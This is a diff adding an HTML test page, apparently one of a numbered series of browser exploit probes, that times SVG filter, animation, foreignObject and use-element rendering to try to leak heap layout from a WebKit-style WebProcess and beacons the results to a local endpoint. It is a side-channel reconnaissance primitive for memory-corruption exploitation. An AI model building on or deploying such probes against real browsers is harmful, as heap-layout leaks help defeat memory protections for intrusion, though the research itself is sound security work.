@@ -1,0 +1,426 @@
+<!--
+  p708: SVG filter primitive internal buffer address leak
+
+  SVG filters allocate intermediate pixel buffers for each filter
+  primitive in the chain. These buffers are allocated from WebProcess
+  heap and their size depends on the input dimensions and filter
+  parameters. Observable timing differences in filter application
+  reveal allocator state and heap layout.
+
+  Attack angles:
+  A) feGaussianBlur timing -- blur radius controls kernel size and
+     intermediate buffer allocation. Timing for different radii on
+     the same input reveals page boundary crossings in the allocator.
+  B) feConvolveMatrix timing -- custom kernel size forces exact
+     buffer dimensions. Timing variance across kernel sizes reveals
+     allocation granularity.
+  C) feTurbulence seed oracle -- feTurbulence generates Perlin noise
+     using an internal PRNG. The seed parameter controls the state.
+     Rendering timing with different seeds may vary if the PRNG
+     state affects cache behavior.
+  D) SVG SMIL animation timing -- animate/animateTransform elements
+     schedule updates on the SVG animation timeline. The callback
+     ordering depends on internal list traversal.
+  E) SVG foreignObject rendering timing -- foreignObject embeds HTML
+     inside SVG, forcing a layout context switch. The timing of this
+     switch depends on internal rendering tree layout.
+  F) SVG use-element deep cloning -- use elements clone referenced
+     subtrees. Deep cloning allocates shadow DOM nodes whose
+     allocation timing reveals heap state.
+
+  CRASH_CLASS: LOW (SVG rendering, read-only observation)
+  prior art: p706 (CSS animation timing), p703 (font timing)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p708</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P708-START:SVG-FILTER-LEAK');
+  var results = [];
+  var svgNS = 'http://www.w3.org/2000/svg';
+
+  // === SECTION A: feGaussianBlur timing vs radius ===
+  b('A:GAUSSIAN-BLUR-TIMING');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+    document.body.appendChild(container);
+
+    var radii = [1, 2, 4, 8, 16, 32, 64];
+    var blurTimes = [];
+
+    for (var r = 0; r < radii.length; r++) {
+      var svg = document.createElementNS(svgNS, 'svg');
+      svg.setAttribute('width', '200');
+      svg.setAttribute('height', '200');
+
+      var defs = document.createElementNS(svgNS, 'defs');
+      var filter = document.createElementNS(svgNS, 'filter');
+      filter.setAttribute('id', 'blur' + r);
+      var feBlur = document.createElementNS(svgNS, 'feGaussianBlur');
+      feBlur.setAttribute('stdDeviation', radii[r]);
+      filter.appendChild(feBlur);
+      defs.appendChild(filter);
+      svg.appendChild(defs);
+
+      var rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('width', '200');
+      rect.setAttribute('height', '200');
+      rect.setAttribute('fill', 'red');
+      rect.setAttribute('filter', 'url(#blur' + r + ')');
+      svg.appendChild(rect);
+      container.appendChild(svg);
+
+      // Force render and measure
+      var t0 = performance.now();
+      for (var i = 0; i < 50; i++) {
+        rect.setAttribute('fill', i % 2 === 0 ? 'red' : 'blue');
+        svg.getBoundingClientRect();
+      }
+      var dt = performance.now() - t0;
+      blurTimes.push(radii[r] + ':' + dt.toFixed(2));
+    }
+    b('A:BLUR-TIMES:' + blurTimes.join(','));
+
+    // Check for non-linear scaling (page boundary crossing)
+    var times = blurTimes.map(function(t) { return parseFloat(t.split(':')[1]); });
+    for (var i = 1; i < times.length; i++) {
+      var radiusRatio = radii[i] / radii[i-1];
+      var timeRatio = times[i] / times[i-1];
+      if (timeRatio > radiusRatio * 2) {
+        b('A:STEP-AT-RADIUS=' + radii[i] + ',TIME-RATIO=' + timeRatio.toFixed(2));
+        results.push('A:blur-step=' + radii[i]);
+      }
+    }
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: feConvolveMatrix kernel size timing ===
+  b('B:CONVOLVE-MATRIX-TIMING');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+    document.body.appendChild(container);
+
+    var kernelSizes = [3, 5, 7, 9, 11];
+    var convTimes = [];
+
+    for (var k = 0; k < kernelSizes.length; k++) {
+      var size = kernelSizes[k];
+      var kernelLen = size * size;
+      var kernelVals = [];
+      for (var i = 0; i < kernelLen; i++) kernelVals.push((1/kernelLen).toFixed(4));
+
+      var svg = document.createElementNS(svgNS, 'svg');
+      svg.setAttribute('width', '100');
+      svg.setAttribute('height', '100');
+
+      var defs = document.createElementNS(svgNS, 'defs');
+      var filter = document.createElementNS(svgNS, 'filter');
+      filter.setAttribute('id', 'conv' + k);
+      var feConv = document.createElementNS(svgNS, 'feConvolveMatrix');
+      feConv.setAttribute('order', size);
+      feConv.setAttribute('kernelMatrix', kernelVals.join(' '));
+      filter.appendChild(feConv);
+      defs.appendChild(filter);
+      svg.appendChild(defs);
+
+      var rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('width', '100');
+      rect.setAttribute('height', '100');
+      rect.setAttribute('fill', 'green');
+      rect.setAttribute('filter', 'url(#conv' + k + ')');
+      svg.appendChild(rect);
+      container.appendChild(svg);
+
+      var t0 = performance.now();
+      for (var i = 0; i < 20; i++) {
+        rect.setAttribute('fill', i % 2 === 0 ? 'green' : 'yellow');
+        svg.getBoundingClientRect();
+      }
+      var dt = performance.now() - t0;
+      convTimes.push(size + 'x' + size + ':' + dt.toFixed(2));
+    }
+    b('B:CONV-TIMES:' + convTimes.join(','));
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: feTurbulence seed oracle ===
+  b('C:TURBULENCE-SEED');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+    document.body.appendChild(container);
+
+    var seeds = [0, 1, 42, 100, 255, 1000, 65535];
+    var seedTimes = [];
+
+    for (var s = 0; s < seeds.length; s++) {
+      var svg = document.createElementNS(svgNS, 'svg');
+      svg.setAttribute('width', '100');
+      svg.setAttribute('height', '100');
+
+      var defs = document.createElementNS(svgNS, 'defs');
+      var filter = document.createElementNS(svgNS, 'filter');
+      filter.setAttribute('id', 'turb' + s);
+      var feTurb = document.createElementNS(svgNS, 'feTurbulence');
+      feTurb.setAttribute('type', 'fractalNoise');
+      feTurb.setAttribute('baseFrequency', '0.05');
+      feTurb.setAttribute('numOctaves', '3');
+      feTurb.setAttribute('seed', seeds[s]);
+      filter.appendChild(feTurb);
+      defs.appendChild(filter);
+      svg.appendChild(defs);
+
+      var rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('width', '100');
+      rect.setAttribute('height', '100');
+      rect.setAttribute('filter', 'url(#turb' + s + ')');
+      svg.appendChild(rect);
+      container.appendChild(svg);
+
+      var t0 = performance.now();
+      for (var i = 0; i < 30; i++) {
+        feTurb.setAttribute('seed', seeds[s] + i);
+        svg.getBoundingClientRect();
+      }
+      var dt = performance.now() - t0;
+      seedTimes.push(seeds[s] + ':' + dt.toFixed(2));
+    }
+    b('C:SEED-TIMES:' + seedTimes.join(','));
+
+    // Check for seed-dependent timing variance
+    var times = seedTimes.map(function(t) { return parseFloat(t.split(':')[1]); });
+    var minT = Math.min.apply(null, times);
+    var maxT = Math.max.apply(null, times);
+    b('C:RANGE:min=' + minT.toFixed(2) + ',max=' + maxT.toFixed(2) + ',ratio=' + (maxT/minT).toFixed(2));
+    if (maxT / minT > 1.5) {
+      results.push('C:seed-timing-variance');
+    }
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: SVG SMIL animation timing ===
+  b('D:SMIL-ANIMATION');
+  try {
+    var svg = document.createElementNS(svgNS, 'svg');
+    svg.setAttribute('width', '200');
+    svg.setAttribute('height', '200');
+    svg.style.cssText = 'position:absolute;left:-9999px;';
+    document.body.appendChild(svg);
+
+    // Check if SMIL is supported
+    var rect = document.createElementNS(svgNS, 'rect');
+    rect.setAttribute('width', '50');
+    rect.setAttribute('height', '50');
+    rect.setAttribute('fill', 'blue');
+    svg.appendChild(rect);
+
+    var anim = document.createElementNS(svgNS, 'animate');
+    anim.setAttribute('attributeName', 'x');
+    anim.setAttribute('from', '0');
+    anim.setAttribute('to', '150');
+    anim.setAttribute('dur', '0.5s');
+    anim.setAttribute('repeatCount', 'indefinite');
+    rect.appendChild(anim);
+
+    // Check SVG animation timeline
+    if (typeof svg.getCurrentTime === 'function') {
+      b('D:SMIL-SUPPORTED');
+      b('D:CURRENT-TIME=' + svg.getCurrentTime().toFixed(4));
+
+      // Create multiple animated elements and check timeline
+      var animTimes = [];
+      for (var i = 0; i < 10; i++) {
+        var el = document.createElementNS(svgNS, 'circle');
+        el.setAttribute('cx', '50');
+        el.setAttribute('cy', '50');
+        el.setAttribute('r', '10');
+        var a = document.createElementNS(svgNS, 'animate');
+        a.setAttribute('attributeName', 'r');
+        a.setAttribute('from', '10');
+        a.setAttribute('to', '40');
+        a.setAttribute('dur', '0.1s');
+        a.setAttribute('begin', (i * 0.01) + 's');
+        el.appendChild(a);
+        svg.appendChild(el);
+      }
+
+      // Sample timeline
+      var timeline = [];
+      for (var s = 0; s < 20; s++) {
+        timeline.push(svg.getCurrentTime().toFixed(6));
+        var waste = 0;
+        for (var j = 0; j < 10000; j++) waste += j;
+      }
+      b('D:TIMELINE:' + timeline.slice(0, 10).join(','));
+
+      // Check timeline resolution
+      var deltas = [];
+      for (var i = 1; i < timeline.length; i++) {
+        var d = parseFloat(timeline[i]) - parseFloat(timeline[i-1]);
+        if (d > 0) deltas.push(d.toFixed(6));
+      }
+      b('D:TIMELINE-DELTAS:' + deltas.slice(0, 5).join(','));
+    } else {
+      b('D:SMIL-NOT-SUPPORTED');
+    }
+
+    document.body.removeChild(svg);
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: SVG foreignObject rendering timing ===
+  b('E:FOREIGNOBJECT');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;';
+    document.body.appendChild(container);
+
+    // Measure time to render SVG with foreignObject vs without
+    var withFO = [];
+    var withoutFO = [];
+
+    for (var round = 0; round < 10; round++) {
+      // With foreignObject
+      var svg1 = document.createElementNS(svgNS, 'svg');
+      svg1.setAttribute('width', '200');
+      svg1.setAttribute('height', '200');
+      var fo = document.createElementNS(svgNS, 'foreignObject');
+      fo.setAttribute('width', '200');
+      fo.setAttribute('height', '200');
+      var div = document.createElement('div');
+      div.style.cssText = 'width:200px;height:200px;overflow:hidden;';
+      for (var i = 0; i < 50; i++) {
+        var span = document.createElement('span');
+        span.textContent = 'Word ' + i + ' ';
+        div.appendChild(span);
+      }
+      fo.appendChild(div);
+      svg1.appendChild(fo);
+      container.appendChild(svg1);
+
+      var t0 = performance.now();
+      svg1.getBoundingClientRect();
+      div.getBoundingClientRect();
+      withFO.push((performance.now() - t0).toFixed(4));
+
+      // Without foreignObject (pure SVG text)
+      var svg2 = document.createElementNS(svgNS, 'svg');
+      svg2.setAttribute('width', '200');
+      svg2.setAttribute('height', '200');
+      for (var i = 0; i < 50; i++) {
+        var text = document.createElementNS(svgNS, 'text');
+        text.setAttribute('x', '10');
+        text.setAttribute('y', (10 + i * 4));
+        text.textContent = 'Word ' + i;
+        svg2.appendChild(text);
+      }
+      container.appendChild(svg2);
+
+      var t1 = performance.now();
+      svg2.getBoundingClientRect();
+      withoutFO.push((performance.now() - t1).toFixed(4));
+    }
+
+    b('E:WITH-FO:' + withFO.join(','));
+    b('E:WITHOUT-FO:' + withoutFO.join(','));
+
+    var avgFO = withFO.reduce(function(a,b){return a+parseFloat(b)},0) / withFO.length;
+    var avgNoFO = withoutFO.reduce(function(a,b){return a+parseFloat(b)},0) / withoutFO.length;
+    b('E:AVG-FO=' + avgFO.toFixed(4) + ',AVG-NOFO=' + avgNoFO.toFixed(4));
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: SVG use-element deep clone timing ===
+  b('F:USE-CLONE-TIMING');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;';
+    document.body.appendChild(container);
+
+    var cloneTimes = [];
+    var depths = [1, 5, 10, 20, 50];
+
+    for (var d = 0; d < depths.length; d++) {
+      var svg = document.createElementNS(svgNS, 'svg');
+      svg.setAttribute('width', '200');
+      svg.setAttribute('height', '200');
+
+      var defs = document.createElementNS(svgNS, 'defs');
+      // Build nested group of given depth
+      var current = document.createElementNS(svgNS, 'g');
+      current.setAttribute('id', 'template' + d);
+      var root = current;
+      for (var i = 0; i < depths[d]; i++) {
+        var child = document.createElementNS(svgNS, 'g');
+        var r = document.createElementNS(svgNS, 'rect');
+        r.setAttribute('width', '5');
+        r.setAttribute('height', '5');
+        r.setAttribute('x', String(i));
+        r.setAttribute('y', String(i));
+        child.appendChild(r);
+        current.appendChild(child);
+        current = child;
+      }
+      defs.appendChild(root);
+      svg.appendChild(defs);
+
+      // Create many use-element clones
+      var t0 = performance.now();
+      for (var i = 0; i < 100; i++) {
+        var use = document.createElementNS(svgNS, 'use');
+        use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#template' + d);
+        use.setAttribute('x', String(i % 10 * 20));
+        use.setAttribute('y', String(Math.floor(i / 10) * 20));
+        svg.appendChild(use);
+      }
+      container.appendChild(svg);
+      svg.getBoundingClientRect(); // force render
+      var dt = performance.now() - t0;
+      cloneTimes.push(depths[d] + ':' + dt.toFixed(2));
+    }
+    b('F:CLONE-TIMES:' + cloneTimes.join(','));
+
+    // Check scaling -- deeper trees should take proportionally longer
+    var times = cloneTimes.map(function(t) { return parseFloat(t.split(':')[1]); });
+    if (times.length >= 2 && times[0] > 0) {
+      var ratio = times[times.length-1] / times[0];
+      var depthRatio = depths[depths.length-1] / depths[0];
+      b('F:SCALE:time-ratio=' + ratio.toFixed(2) + ',depth-ratio=' + depthRatio.toFixed(0));
+      if (ratio > depthRatio * 1.5) {
+        results.push('F:clone-superlinear');
+      }
+    }
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P708-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P708-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P708-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p708: SVG filter primitive internal buffer address leak</pre></body></html>
